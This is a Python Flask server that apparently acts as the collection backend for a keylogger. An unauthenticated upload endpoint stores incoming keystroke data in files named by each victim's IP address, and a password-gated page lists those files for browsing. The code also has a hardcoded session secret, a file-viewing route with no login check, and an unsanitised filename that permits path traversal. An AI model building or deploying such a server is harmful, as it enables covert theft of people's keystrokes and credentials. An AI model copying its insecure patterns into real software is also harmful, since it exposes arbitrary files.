from flask import Flask, render_template, request, redirect, url_for, session
import os
import subprocess
import time
import hashlib
from functools import wraps

app = Flask(__name__)

app.secret_key = 'Kendel'

CURRENT_FOLDER = os.getcwd()
PASSWORD_FOLDER = 'password'  # Name of the password subfolder
KEYLOG_FOLDER = 'keylog'  # Name of the keylog subfolder

# Define a session variable to track user authentication
SESSION_KEY_AUTHENTICATED = 'authenticated'

def run_rust_program():
    try:
        executable_path = os.path.join(CURRENT_FOLDER, "target", "debug", "password_generator.exe")
        subprocess.run([executable_path], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running Rust program: {e}")
    except FileNotFoundError:
        print("Rust executable not found.")

def load_password():
    try:
        password_path = os.path.join(CURRENT_FOLDER, PASSWORD_FOLDER, "password.txt")
        with open(os.path.join(password_path), 'r') as file:
            return file.read().strip()
    except FileNotFoundError:
        return None

def hash_login_password(password):
    sha256 = hashlib.sha256()
    sha256.update(password.encode())
    return sha256.hexdigest()

def is_authenticated():
    return session.get(SESSION_KEY_AUTHENTICATED, False)

def login_required(func):
    @wraps(func)
    def decorated_function(*args, **kwargs):
        if not is_authenticated():
            return redirect(url_for('login'))  # Redirect to login page if not authenticated
        return func(*args, **kwargs)
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login():
    # Clear the user's session when they visit the login page
    session.pop(SESSION_KEY_AUTHENTICATED, None)

    if request.method == 'POST':
        entered_password = request.form['password']
        saved_password_hash = load_password()

        if saved_password_hash is not None and hash_login_password(entered_password) == saved_password_hash:
            session[SESSION_KEY_AUTHENTICATED] = True  # Set session data to mark user as authenticated
            return redirect(url_for('index'))

        error_message = 'Invalid password'
        return render_template('login.html', error=error_message)

    return render_template('login.html')

@app.route('/')
def index():
    if not is_authenticated():
        return redirect(url_for('login'))

    txt_files = get_txt_files()
    links = generate_links(txt_files)

    content = "<br>".join(links)
    return render_template('index.html', content=content)


@app.route('/files/<filename>')
def show_file(filename):
    try:
        file_path = os.path.join(CURRENT_FOLDER, KEYLOG_FOLDER, filename)
        with open(file_path, 'r') as file:
            content = file.read()
        return f"<pre>{content}</pre>"
    except FileNotFoundError:
        return f"File not found: {filename}"

def get_txt_files():
    txt_files = [f for f in os.listdir(os.path.join(CURRENT_FOLDER, KEYLOG_FOLDER)) if f.endswith('.txt')]
    return txt_files


def generate_links(txt_files):
    links = []
    for file in txt_files:
        link = f'<a href="/files/{file}">{file}</a>'
        links.append(link)
    return links

@app.route('/upload', methods=['POST'])
def upload_file():
    keylog_data = request.get_data(as_text=True)  # Get the uploaded data as text

    # Get the public IP address from the request
    client_ip = request.remote_addr  # This will retrieve the client's public IP address

    print(f"Received keylog data: {keylog_data}")
    filename = f'keylog_{client_ip}.txt'
    file_path = os.path.join(KEYLOG_FOLDER, filename)
    print(f"Writing to file: {file_path}")

    with open(os.path.join(KEYLOG_FOLDER, filename), 'a', encoding='utf-8') as file:
        file.write(keylog_data + '\n')

    return "Keylog data captured and saved successfully"


if __name__ == '__main__':
    run_rust_program()
    app.run(host='127.0.0.1', port=15005)